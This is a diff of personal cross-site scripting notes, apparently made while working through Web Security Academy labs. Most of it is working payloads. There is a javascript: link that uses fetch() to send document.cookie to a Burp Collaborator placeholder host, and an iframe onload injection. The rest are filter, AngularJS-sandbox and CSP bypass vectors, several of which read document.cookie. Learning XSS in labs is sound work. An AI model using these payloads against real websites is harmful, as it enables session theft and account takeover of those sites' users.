@@ -23,7 +23,7 @@ body:document.cookie
 });
 </script>
 
-for cookia stelling herf
+for cookie stelling HREF
 javascript:fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'POST',
 mode: 'no-cors',
@@ -31,19 +31,19 @@ body:document.cookie
 });
 
 
+|||||||||||||||||||||||||||||||||||||||||||||||||||||
+HTML HTML HTML entities test ===>
+&#x6c;&#x65;&#x65;&#x31;&#x30;&#x31;
+|||||||||||||||||||||||||||||||||||||||||||||
 
 
 for seperate html page
 <iframe src="https://0a97007b03b5c853c0631f0600af003c.web-security-academy.net/" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 
 
-
-|||||||||||||||||||||||||||||||||||||||||||||||||||||
-html entities test ===>
-&#x6c;&#x65;&#x65;&#x31;&#x30;&#x31;
-
-for anchor href inputs this payload to store <a src="javascript:alert(1)">website</a> ++++===>
+for anchor HREF inputs this payload to store <a src="javascript:alert(1)">LIKE website</a> ++++===>
 javascript:alert(1)
+http://foo?&apos;-alert(1)-&apos;
 
 
 ||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -55,9 +55,20 @@ for testing =====>
 '-alert(1)-'
 {{$on.constructor('alert(1)')()}}
 \"-alert(1)}//
+\'-alert(1)//
+${alert(1)}
 <><img src=1 onerror=alert(1)>
+</script><script>alert(1)</script>
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+
 
 ||||||||||||||||||||||||||||||||||||||||||||||||||||||
-special url payloads =========>
+special url and id payloads =========>
 "></select><img%20src=1%20onerror=alert(1)>
 <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+/?'accesskey='x'onclick='alert(1)
+"><svg><animatetransform onbegin=alert(1)>
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
